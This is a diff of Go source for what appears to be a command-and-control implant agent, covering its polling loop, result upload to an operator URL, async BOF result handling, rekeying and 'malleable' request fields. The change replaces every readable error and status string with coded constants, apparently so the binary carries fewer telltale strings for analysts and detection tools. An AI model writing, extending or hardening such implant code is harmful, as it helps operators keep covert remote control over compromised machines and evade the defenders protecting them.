@@ -112,7 +112,7 @@ func tryDecryptResponse(rawResponse map[string]interface{}, xorKey []byte) (map[
 		}
 	}
 
-	return nil, fmt.Errorf("no valid encrypted response found")
+	return nil, fmt.Errorf(Err(E18))
 }
 
 // checkAsyncBOFResults checks for pending async BOF results (Windows only)
@@ -142,7 +142,7 @@ func sendResults(encryptedData string, customHeaders map[string]string) error {
 
 	jsonData, err := json.Marshal(postData)
 	if err != nil {
-		return fmt.Errorf("failed to marshal post data: %v", err)
+		return fmt.Errorf(ErrCtx(E18, err.Error()))
 	}
 
 	// Get the custom POST method from decrypted values
@@ -154,7 +154,7 @@ func sendResults(encryptedData string, customHeaders map[string]string) error {
 	// Create request with custom method
 	req, err := http.NewRequest(method, postURL, bytes.NewBuffer(jsonData))
 	if err != nil {
-		return fmt.Errorf("failed to create %s request: %v", method, err)
+		return fmt.Errorf(ErrCtx(E12, err.Error()))
 	}
 
 	req.Header.Set("Content-Type", "application/json")
@@ -174,7 +174,7 @@ func sendResults(encryptedData string, customHeaders map[string]string) error {
 
 	resp, err := client.Do(req)
 	if err != nil {
-		return fmt.Errorf("failed to send %s request: %v", method, err)
+		return fmt.Errorf(ErrCtx(E12, err.Error()))
 	}
 	defer func() {
 		io.Copy(io.Discard, resp.Body) // drain body
@@ -182,7 +182,7 @@ func sendResults(encryptedData string, customHeaders map[string]string) error {
 	}()
 
 	if resp.StatusCode != http.StatusOK {
-		return fmt.Errorf("server returned non-200 status code: %d", resp.StatusCode)
+		return fmt.Errorf(ErrCtx(E12, fmt.Sprintf("%d", resp.StatusCode)))
 	}
 
 	return nil
@@ -203,7 +203,7 @@ func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
 	// Create the request with custom method
 	req, err := http.NewRequest(method, getURL, nil)
 	if err != nil {
-		return fmt.Errorf("failed to create %s request: %v", method, err)
+		return fmt.Errorf(ErrCtx(E12, err.Error()))
 	}
 
 	// Set headers
@@ -225,7 +225,7 @@ func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
 	// Send request
 	resp, err := client.Do(req)
 	if err != nil {
-		return fmt.Errorf("failed to send %s request: %v", method, err)
+		return fmt.Errorf(ErrCtx(E12, err.Error()))
 	}
 	defer func() {
 		io.Copy(io.Discard, resp.Body)
@@ -235,13 +235,13 @@ func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
 	// Read response body
 	body, err := io.ReadAll(resp.Body)
 	if err != nil {
-		return fmt.Errorf("failed to read response: %v", err)
+		return fmt.Errorf(ErrCtx(E10, err.Error()))
 	}
 
 	// First try to parse as raw JSON
 	var rawResponse map[string]interface{}
 	if err := json.Unmarshal(body, &rawResponse); err != nil {
-		return fmt.Errorf("failed to parse response: %v", err)
+		return fmt.Errorf(ErrCtx(E18, err.Error()))
 	}
 
 	// Use a generic response map instead of struct to support malleable field names
@@ -317,7 +317,7 @@ func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
 				AgentID:     clientID,
 			},
 			CompletedAt: time.Now().Format(time.RFC3339),
-			Output:      "Rekey initiated",
+			Output:      Succ(S15),
 			ExitCode:    0,
 		}
 
@@ -341,7 +341,7 @@ func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
 
 		// Return immediately - the new goroutine will handle the rekey
 		// This allows the current polling goroutine to exit cleanly
-		return fmt.Errorf("rekey in progress")
+		return fmt.Errorf(Err(E19))
 	}
 
 	// IMPORTANT: Process handshake responses BEFORE commands!
@@ -606,7 +606,7 @@ func startPolling(config PollConfig, sysInfo *SystemInfoReport) error {
 	// Parse custom headers from handshakeManager
 	customHeaders, err := parseCustomHeaders(handshakeManager.decryptedValues["Custom Headers"])
 	if err != nil {
-		return fmt.Errorf("failed to parse custom headers: %v", err)
+		return fmt.Errorf(ErrCtx(E18, err.Error()))
 	}
 
 	// Add to WaitGroup before starting goroutine
@@ -720,12 +720,12 @@ func startPolling(config PollConfig, sysInfo *SystemInfoReport) error {
 			// Perform the poll AFTER sleep
 			if err := doPoll(secureComms, customHeaders); err != nil {
 				// Check if this is a rekey in progress - if so, exit the entire goroutine
-				if err.Error() == "rekey in progress" {
+				if err.Error() == E19 {
 					//fmt.Println("Rekey initiated, exiting current polling loop")
 					break pollingLoop // Break out of the outer for loop
 				}
 				// Check for decryption failures
-				if strings.Contains(err.Error(), "failed to decrypt response") {
+				if strings.Contains(err.Error(), E18) {
 					// Could trigger automatic rekey here if needed
 				}
 				consecutiveErrors++
